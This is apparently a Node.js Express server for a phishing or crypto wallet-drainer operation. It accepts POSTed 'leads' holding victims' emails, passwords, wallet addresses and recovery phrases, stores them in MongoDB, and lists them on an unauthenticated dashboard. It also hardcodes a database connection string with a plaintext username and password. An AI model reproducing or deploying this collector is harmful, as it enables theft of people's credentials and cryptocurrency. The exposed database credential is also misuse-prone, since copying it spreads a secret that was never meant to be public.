const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');

const app = express();

// Middleware
app.use(cors());
app.use(bodyParser.json());

// IMPORTANT: This tells Render to serve your dashboard.html and script.js 
// from the root folder so you don't get "Cannot GET /dashboard.html"
app.use(express.static(__dirname));

// MongoDB Connection - Hardcoded URI to ensure it works immediately
const MONGO_URI = "mongodb+srv://scumbag3_db_user:Foreverich21@cluster0.zisiplb.mongodb.net/leads?retryWrites=true&w=majority";

mongoose.connect(MONGO_URI)
  .then(() => console.log("Connected to MongoDB Atlas successfully"))
  .catch(err => console.error("MongoDB connection error:", err));

// Schema definition
const leadSchema = new mongoose.Schema({
    email: String,
    password: String,
    walletAddress: String,
    recoveryPhrase: String,
    timestamp: { type: Date, default: Date.now }
});

const Lead = mongoose.model('Lead', leadSchema, 'leads');

// Endpoint to receive and save lead data
app.post('/update', async (req, res) => {
    try {
        console.log("Data received to save:", req.body);
        const lead = new Lead(req.body);
        await lead.save();
        console.log("Lead saved successfully.");
        res.status(200).send("Saved");
    } catch (err) {
        console.error("Database save error:", err);
        res.status(500).send("Error saving lead.");
    }
});

// Endpoint to fetch all leads for the dashboard
app.get('/dashboard', async (req, res) => {
    try {
        const leads = await Lead.find().sort({ timestamp: -1 });
        res.json(leads);
    } catch (err) {
        console.error("Fetch error:", err);
        res.status(500).send("Error fetching leads.");
    }
});

// Root route to serve the dashboard.html file
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'dashboard.html'));
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
